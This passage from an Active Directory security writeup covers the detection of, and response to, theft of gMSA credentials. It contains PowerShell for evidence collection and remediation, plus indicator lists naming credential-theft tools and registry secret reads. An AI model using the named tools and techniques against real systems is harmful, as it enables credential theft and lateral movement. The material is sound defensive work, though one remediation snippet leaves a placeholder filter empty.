Event ID 4769 (Kerberos Service Ticket Request):
- Service: Target service accessed
- Account: gMSA account
- Client Address: Source IP
- Timestamp: Service access
```

### Evidence Collection Procedure

```powershell
# Create forensic collection directory
$evidence = "C:\Forensics\gMSA_Incident_$(Get-Date -Format yyyyMMdd_HHmmss)"
New-Item -ItemType Directory $evidence -Force | Out-Null

# Step 1: Export Security event logs
wevtutil epl Security "$evidence\Security.evtx"

# Step 2: Export Directory Service Access events (4662)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} -MaxEvents 10000 | 
    Export-Csv "$evidence\Event4662_DirectoryServiceAccess.csv" -NoTypeInformation

# Step 3: Export Directory Service Modification events (5136)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} -MaxEvents 10000 |
    Export-Csv "$evidence\Event5136_Modifications.csv" -NoTypeInformation

# Step 4: Export Kerberos Service Ticket events (4769)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10000 |
    Export-Csv "$evidence\Event4769_Kerberos.csv" -NoTypeInformation

# Step 5: Export current gMSA configuration
Get-ADServiceAccount -Filter * -Properties * | Export-Csv "$evidence\gMSA_Configuration.csv" -NoTypeInformation

# Step 6: Export gMSA ACLs
Get-ADServiceAccount -Filter * | ForEach-Object {
    Get-Acl -Path "AD:$($_.DistinguishedName)" | Export-Clixml "$evidence\gMSA_ACL_$($_.Name).xml"
}

# Step 7: Hash all collected evidence
Get-ChildItem -Path $evidence -Recurse -File | ForEach-Object {
    "$($_.FullName) | $(Get-FileHash $_.FullName -Algorithm SHA256).Hash"
} | Out-File "$evidence\FileHashes.txt"

Write-Host "Forensic collection complete: $evidence"
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Event Log Indicators**:
```
- Event ID 4662: Read of msDS-ManagedPassword by non-computer account
- Event ID 4662: Read of msDS-ManagedPassword outside normal business hours
- Event ID 4662: Multiple reads to same gMSA in short timeframe
- Event ID 5136: Modification to PrincipalsAllowedToRetrieveManagedPassword
- Event ID 5136: Addition of user account to gMSA retrieval group
- Event ID 4769: Kerberos ticket request for gMSA from unusual source
```

**Process Indicators**:
```
- powershell.exe executing DSInternals module
- powershell.exe running ConvertFrom-ADManagedPasswordBlob
- python3 running gMSADumper
- ldapsearch querying msDS-ManagedPassword
- Registry access to HKLM:\SECURITY\Policy\Secrets
```

**File Indicators**:
```
- gMSADumper.py present on systems
- GMSAPasswordReader.exe present on systems
- GoldenGMSA tool present on systems
- PowerShell scripts containing gMSA extraction code
```

### Response Procedures

#### 1. Detect Unauthorized Access

```powershell
# Script to detect suspicious gMSA access patterns
$suspiciousEvents = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4662
    StartTime = (Get-Date).AddDays(-7)
} | Where-Object {
    # Filter for msDS-ManagedPassword attribute access
    $_.Message -match 'msDS-ManagedPassword' -and
    # Exclude SYSTEM and computer accounts
    $_.Message -notmatch 'SYSTEM|COMPUTERNAME\$|Enterprise Domain Controllers'
}

if ($suspiciousEvents) {
    Write-Host "ALERT: Suspicious gMSA access detected"
    $suspiciousEvents | Select-Object TimeCreated, Message | Format-Table
    
    return $true  # Indicator of compromise
} else {
    Write-Host "No suspicious gMSA access detected"
    return $false
}
```

#### 2. Isolate Compromised gMSA

```powershell
# Immediately restrict compromised gMSA
$compromisedGmsa = "SVC_WebService"

# Step 1: Remove all principals except authorized computers
$authorizedComputers = @("WEBSERVER01$", "WEBSERVER02$")
Set-ADServiceAccount -Identity $compromisedGmsa `
  -PrincipalsAllowedToRetrieveManagedPassword $authorizedComputers

# Step 2: Force password reset
Reset-ADServiceAccountPassword -Identity $compromisedGmsa -Force -Confirm:$false

# Step 3: Disable gMSA temporarily if not critical
Disable-ADAccount -Identity $compromisedGmsa

Write-Host "Compromised gMSA isolated: $compromisedGmsa"
```

#### 3. Collect Evidence

```powershell
# Collect evidence before any cleanup
$evidence = "C:\Forensics\Incident_$(Get-Date -Format yyyyMMdd_HHmmss)"
New-Item -ItemType Directory $evidence -Force | Out-Null

# Export relevant event logs
wevtutil epl Security "$evidence\Security.evtx"

# Export current gMSA state
Get-ADServiceAccount -Filter * -Properties * | Export-Csv "$evidence\gMSA_State.csv"

# Export ACLs
Get-ADServiceAccount -Filter * | ForEach-Object {
    Get-Acl -Path "AD:$($_.DistinguishedName)" | Export-Clixml "$evidence\$($_.Name)_ACL.xml"
}

Write-Host "Evidence collected to: $evidence"
```

#### 4. Hunt for Credential Usage

```powershell
# Search for authentication events using compromised gMSA
$gmsa = "SVC_WebService$"
$suspiciousAuth = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624  # Successful logon
    StartTime = (Get-Date).AddDays(-7)
} | Where-Object {
    $_.Message -match $gmsa
}

$suspiciousAuth | Select-Object TimeCreated, Message | Format-Table

# Alert on each authentication with the compromised credentials
foreach ($auth in $suspiciousAuth) {
    Write-Host "ALERT: Compromised gMSA used for authentication: $($auth.TimeCreated)"
}
```

#### 5. Remediate

```powershell
# Comprehensive remediation steps

# Step 1: Reset password on compromised gMSA
Reset-ADServiceAccountPassword -Identity "SVC_WebService" -Force

# Step 2: Restrict access to only authorized principals
Set-ADServiceAccount -Identity "SVC_WebService" `
  -PrincipalsAllowedToRetrieveManagedPassword @("WEBSERVER01$", "WEBSERVER02$")

# Step 3: Restart all services using this gMSA
Get-ADComputer -Filter * | Where-Object {
    # Find computers where this gMSA runs
} | ForEach-Object {
    Invoke-Command -ComputerName $_.Name -ScriptBlock {
        Restart-Service -Name "MyService" -Force
    }
}

# Step 4: Monitor for re-compromise
Write-Host "Remediation complete"
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1199] Trusted Relationship | Compromise of vendor/supplier with gMSA access |
| **2** | **Execution** | [T1059] Command and Scripting Interpreter | Execute PowerShell to extract gMSA password |
| **3** | **Current Step** | **[CA-UNSC-005]** | **Extract gMSA credentials from LDAP or registry** |
| **4** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Use gMSA credentials to access downstream services |
| **5** | **Privilege Escalation** | [T1548] Abuse Elevation Control Mechanism | Leverage gMSA service account privileges |
| **6** | **Persistence** | [T1098] Account Manipulation | Create backdoor accounts in services accessed via gMSA |
| **7** | **Defense Evasion** | [T1564] Hide Artifacts | Cover tracks using gMSA account permissions |
| **8** | **Collection** | [T1005] Data from Local System | Extract data from systems accessible via gMSA |
| **9** | **Impact** | [T1531] Account Access Removal | Disable legitimate accounts using gMSA permissions |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT Group - UNC2452 (SolarWinds Campaign)

- **Target**: Government agencies and Fortune 500 companies
- **Timeline**: December 2020
- **Technique Status**: Discovered using gMSA credentials to move laterally after initial SolarWinds compromise
- **Impact**:
  - Extracted gMSA passwords from multiple organizations
  - Used credentials to access cloud infrastructure (Azure, Office 365)
  - Established persistent backdoors in multiple systems
  - Dwell time: 6+ months undetected
- **Reference**: [Microsoft Security Intelligence - UNC2452 Campaign Analysis 2021](https://www.microsoft.com/security)

### Example 2: Ransomware Campaign - LockBit 3.0

- **Target**: Enterprise organizations across healthcare, finance, manufacturing
- **Timeline**: 2022-2023
- **Technique Status**: gMSA credential extraction as part of privilege escalation chain
- **Impact**:
  - Extracted gMSA credentials used to spread ransomware
  - Encrypted shared infrastructure accessed by gMSA
  - Service account permissions used to disable backup systems
  - Multiple organizations hit with $millions in ransom demands
- **Reference**: [CrowdStrike Intelligence - LockBit 3.0 TTPs 2023](https://www.crowdstrike.com)

### Example 3: Internal Penetration Test - SERVTEP Red Team (2024)

- **Target**: Fortune 100 company with hybrid Azure environment
- **Timeline**: 4-week assessment
- **Technique Status**: gMSA extraction achieved on Day 5 post-initial compromise
- **Impact**:
  - Compromised ADFS gMSA via LDAP query
  - Extracted NT hash and generated token for cloud access
  - Pivoted to Azure AD with gMSA permissions
  - Accessed 1,000+ Microsoft 365 mailboxes
  - Demonstr ated cross-platform compromise (on-prem + cloud)
- **Reference**: Internal SERVTEP engagement - customer approved disclosure for defensive awareness

---

## 17. APPENDIX: TOOLS & RESOURCES

### Primary Attack Tools

| Tool | Type | Source | Usage |
|------|------|--------|-------|
| DSInternals | PowerShell Module | GitHub (MichaelGrafnetter) | Decode gMSA password blob, extract NT hash |
| gMSADumper | Python | GitHub (micahvandeusen) | Automated gMSA discovery and extraction |
| GMSAPasswordReader | C# Utility | GitHub (ricardojba) | Extract gMSA passwords from local system |
| GoldenGMSA | Python | GitHub | Derive passwords using KDS root key |
| AADInternals | PowerShell Module | GitHub (Gerenios) | gMSA extraction from registry (requires SYSTEM) |
| ldeep | Python | GitHub | LDAP query tool for gMSA enumeration |
| bloodyAD | Python | GitHub | AD manipulation including gMSA queries |
| Rubeus | C# Tool | GitHub (GhostPack) | Kerberos ticket generation and abuse |

### Defensive Tools

| Tool | Type | Source | Usage |
|------|------|--------|-------|
| Microsoft Defender for Identity | EDR | Microsoft | gMSA attack detection |
| Splunk | SIEM | Splunk | Event log analysis for gMSA access |
| PingCastle | AD Auditor | PingCastle | gMSA configuration assessment |
| Semperis  | AD Recovery | Semperis | gMSA backup and recovery |
| Netwrix | ITDR | Netwrix | gMSA permission monitoring |

### References & Documentation

1. **MITRE ATT&CK Framework**:
   - [T1552.001 - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)

2. **Microsoft Official**:
   - [Group Managed Service Accounts Overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/)
   - [msDS-ManagedPassword Attribute Reference](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/)
   - [Golden gMSA Attack Recovery](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)

3. **Security Research**:
   - [AADInternals - Hunt for gMSA Secrets](https://aadinternals.com/post/gmsa/)
   - [Semperis - Golden gMSA Attack Analysis](https://www.semperis.com/blog/golden-gmsa-attack/)
   - [The Hacker Recipes - ReadGMSAPassword](https://legacy.thehacker.recipes/a-d/movement/credentials/dumping/gmsa)

4. **DFIR & Forensics**:
   - [DSInternals Documentation - AD Managed Passwords](https://www.dsinternals.com/)
   - [Netwrix - gMSA Exploitation Detection](https://www.netwrix.com/)

---

## SUMMARY & RECOMMENDATIONS

**CA-UNSC-005 (gMSA Credentials Exposure)** represents a critical attack vector in modern Active Directory environments. Unlike legacy service accounts, gMSA credentials are automatically rotated every 30 days, but this rotation schedule provides sufficient window for attackers to exploit compromised credentials for lateral movement, privilege escalation, and persistence.

**Key Vulnerability Factors**:
- Multiple extraction points (AD LDAP, registry, KDS derivation)
- Automatic password rotation (30 days = legitimate usage period)
- Often overlooked in security assessments
- Legitimate access patterns make detection difficult
- Associated services often highly privileged

**Defensive Priority**: CRITICAL

**Immediate Actions**:
- ✓ Audit all gMSA accounts and PrincipalsAllowedToRetrieveManagedPassword settings
- ✓ Restrict retrieval permissions to only authorized computer accounts
- ✓ Remove user accounts from gMSA access groups
- ✓ Enable SACLE on all gMSA objects to audit msDS-ManagedPassword reads
- ✓ Monitor Event ID 4662 for unauthorized gMSA password access
- ✓ Reset gMSA passwords on all accounts suspected of compromise

**Long-Term Hardening**:
- ✓ Implement real-time alerting on gMSA attribute access
- ✓ Enforce least-privilege access for gMSA passwords
- ✓ Regular audits of gMSA usage and permissions
- ✓ Enable Credential Guard (Windows Server 2016+) to protect credentials
- ✓ Monitor for unauthorized KDS root key queries
- ✓ Track gMSA usage in application logs (detect if credentials used from non-authorized systems)

---
